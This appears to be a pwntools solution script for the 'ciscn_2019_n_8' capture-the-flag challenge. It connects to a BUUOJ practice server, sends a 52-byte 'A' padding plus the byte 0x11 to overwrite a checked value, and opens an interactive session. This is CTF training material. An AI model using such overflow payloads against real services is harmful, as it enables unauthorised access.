from pwn import *


def ciscn_2019_n_8(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_8'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 26066)

    payload = b'A' * 52
    payload += b'\x11'  # p32(17)

    target.sendlineafter("What's your name?", payload)

    target.interactive()


if __name__ == '__main__':
    ciscn_2019_n_8()
